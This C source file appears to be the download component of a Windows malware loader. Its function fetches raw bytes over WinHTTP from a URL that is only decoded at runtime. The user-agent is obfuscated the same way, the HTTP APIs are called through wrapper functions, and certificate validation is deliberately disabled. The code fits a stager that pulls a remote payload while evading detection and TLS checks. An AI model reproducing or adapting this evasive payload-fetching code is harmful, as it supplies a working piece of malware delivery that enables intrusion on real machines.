#include "lucky_http.h"

// Function to download raw bytes into a buffer
unsigned char *DownloadRawBytes(DWORD *outSize) {

  HINTERNET hSession = NULL;
  HINTERNET hConnect = NULL;
  HINTERNET hRequest = NULL;
  unsigned char *buffer = NULL;
  DWORD totalSize = 0;
  URL_COMPONENTS uc = {0};
  uc.dwStructSize = sizeof(uc);
  uc.dwSchemeLength = (DWORD)-1;
  uc.dwHostNameLength = (DWORD)-1;
  uc.dwUrlPathLength = (DWORD)-1;
  uc.dwExtraInfoLength = (DWORD)-1;

  char url[sizeof(s_Url) * 2];

  DecodeString(url, s_Url);

  size_t len1 = MyMultiByteToWideChar(CP_UTF8, 0, url, -1, NULL, 0);
  if (len1 == 0) {

    return NULL;
  }

  wchar_t *wstr1 = malloc(len1 * sizeof(wchar_t));

  MyMultiByteToWideChar(CP_UTF8, 0, url, -1, wstr1, len1);

  if (!MyWinHttpCrackUrl(wstr1, 0, 0, &uc)) {
    goto cleanup;
  }
  WCHAR host[256] = {0};
  WCHAR path[2048] = {0};
  if (uc.dwHostNameLength >= 256) {
    goto cleanup;
  }

  wcsncpy_s(host, 256, uc.lpszHostName, uc.dwHostNameLength);
  wcsncpy_s(path, 2048, uc.lpszUrlPath, uc.dwUrlPathLength);
  DWORD fullPathLen = uc.dwUrlPathLength + uc.dwExtraInfoLength;
  if (fullPathLen >= 2048) {
    goto cleanup;
  }
  if (uc.dwExtraInfoLength > 0)
    wcsncat_s(path, 2048, uc.lpszExtraInfo, uc.dwExtraInfoLength);
  DWORD flags = 0;
  if (uc.nScheme == INTERNET_SCHEME_HTTPS)
    flags |= WINHTTP_FLAG_SECURE;

  char agent[128];

  DecodeString(agent, s_UserAgent);

  size_t len = MyMultiByteToWideChar(CP_UTF8, 0, agent, -1, NULL, 0);
  if (len == 0) {

    return NULL;
  }

  wchar_t *wstr = malloc(len * sizeof(wchar_t));

  MyMultiByteToWideChar(CP_UTF8, 0, agent, -1, wstr, len);

  hSession = MyWinHttpOpen(wstr, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);

  if (!hSession) {

    goto cleanup;
  }

  DWORD protocols = WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_2 | WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_3;
  MyWinHttpSetOption(hSession, WINHTTP_OPTION_SECURE_PROTOCOLS, &protocols, sizeof(protocols));
  DWORD securityFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
  MyWinHttpSetOption(hSession, WINHTTP_OPTION_SECURITY_FLAGS, &securityFlags, sizeof(securityFlags));

  hConnect = MyWinHttpConnect(hSession, host, uc.nPort, 0);
  if (!hConnect) {

    goto cleanup;
  }

  hRequest = MyWinHttpOpenRequest(hConnect, L"GET", path, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
  if (!hRequest) {

    goto cleanup;
  }

  if (!MyWinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {

    goto cleanup;
  }

  if (!MyWinHttpReceiveResponse(hRequest, NULL)) {

    goto cleanup;
  }
  DWORD status = 0;
  DWORD size = sizeof(status);

  MyWinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, WINHTTP_HEADER_NAME_BY_INDEX, &status, &size, WINHTTP_NO_HEADER_INDEX);
  if (status != 200) {
    goto cleanup;
  }

  do {
    DWORD avail = 0;
    DWORD read = 0;
    if (!MyWinHttpQueryDataAvailable(hRequest, &avail)) {
      goto cleanup;
    }
    if (avail == 0) {
      break;
    }

    unsigned char *newBuf = realloc(buffer, totalSize + avail);
    if (!newBuf) {
      goto cleanup;
    }
    buffer = newBuf;
    if (!MyWinHttpReadData(hRequest, buffer + totalSize, avail, &read)) {
      goto cleanup;
    }
    totalSize += read;
  } while (1);

  if (outSize) {

    *outSize = totalSize;
  }

cleanup:

  if (hRequest) {
    MyWinHttpCloseHandle(hRequest);
  }
  if (hConnect) {
    MyWinHttpCloseHandle(hConnect);
  }
  if (hSession) {
    MyWinHttpCloseHandle(hSession);
  }

  return buffer;
}
